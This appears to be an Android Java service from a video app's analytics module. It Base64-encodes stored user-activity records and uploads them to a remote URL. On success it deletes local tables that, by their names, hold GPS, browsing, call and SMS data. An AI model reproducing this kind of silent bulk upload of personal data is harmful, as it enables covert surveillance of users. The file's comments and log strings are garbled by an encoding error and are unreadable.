package tv.pps.bi.proto;

import org.apache.commons.codec.binary.Base64;

import tv.pps.bi.db.DBAPPManager;
import tv.pps.bi.db.DBOperation;
import tv.pps.bi.db.config.DBConstance;
import tv.pps.bi.proto.model.UserActivity;
import tv.pps.bi.utils.LogUtils;
import tv.pps.bi.utils.ProtoNetWorkManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * ����������з����û�����Ϊ��Ϣ
 * 
 * @author jiangqingqing
 * @time 2013/09/04
 */
public class SendUserActivityService extends Service {

	private MessageToEntityService mMsgService; // ��ȡ�û���Ϊ��Ϣ ����װ��ʵ�����
	private ProtoBuffUserActivityService mProtoBuffUserActivityService;
	private UserActivity mUserActivity;
	private byte[] infoBytes; //protobuff��ʽ���ĵ��ֽ�����
	private Base64 base64;
	private Context mContext;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		mContext=this;
		super.onCreate();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mMsgService = new MessageToEntityService(mContext);
		mUserActivity = mMsgService.getMsgUserEntity();
		//mMsgService.close();//�ر����ݿ�
		mProtoBuffUserActivityService = new ProtoBuffUserActivityService();
		infoBytes = mProtoBuffUserActivityService
				.getConstructorData(mUserActivity);
		LogUtils.v("bi", "Ҫpost��ProtoBuff����Ϊ:" + new String(infoBytes));
		// ���м���
		// base64 = new Base64();
		// post_str = new String(base64.encodeBase64Chunked(infoBytes));
		Thread thread = new Thread(Runnable_PostMsg);
		thread.start();
		return super.onStartCommand(intent, flags, startId);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	/**
	 * ������̨�߳̽���Post�û���Ϊ��Ϣ
	 */
	Runnable Runnable_PostMsg = new Runnable() {
		@SuppressWarnings("static-access")
		@Override
		public void run() {
			// ���м��� �ϴ�
			base64 = new Base64();
			
			boolean result=false ;
			result= ProtoNetWorkManager
					.postUserActivityByByte(
							base64.encodeBase64Chunked(infoBytes),ProtoNetWorkManager.DELIVER_URL);
			if (result) {
				//ɾ�����ͳɹ������ݱ��е�����
				LogUtils.i("sendData", "�������ݷ��ͳɹ���׼��ɾ�����ݿ��е����ݱ�");
				DBAPPManager manager=DBAPPManager.getDBManager(mContext); 	
				manager.delete();
				DBOperation operation = new DBOperation(mContext);
				operation.deleteRecordsInTable(DBConstance.TABLE_GPS);  //ɾ��GPS��Ϣ����
				operation.deleteRecordsInTable(DBConstance.TABLE_URL);     //ɾ����ҳ�����¼��Ϣ����
				operation.deleteRecordsInTable(DBConstance.TABLE_BOOT_TIME); //ɾ��ϵͳ����ʱ����Ϣ����
				operation.deleteRecordsInTable(DBConstance.TABLE_SHUT_TIME);
				operation.deleteRecordsInTable(DBConstance.TABLE_PHONE); //ɾ����绰ʱ�����Ϣ����
				operation.deleteRecordsInTable(DBConstance.TABLE_SMS); //ɾ����������Ϣ����
				operation.close();
				LogUtils.i("sendData", "�ɹ�ɾ�����ݿ��е����ݱ�");
				LogUtils.v("sendData", "Post���󷵻ؽ��Ϊ���ɹ�");
			} else {
				LogUtils.v("sendData", "Post���󷵻ؽ��Ϊ��ʧ��");
			}
		}
	};
}
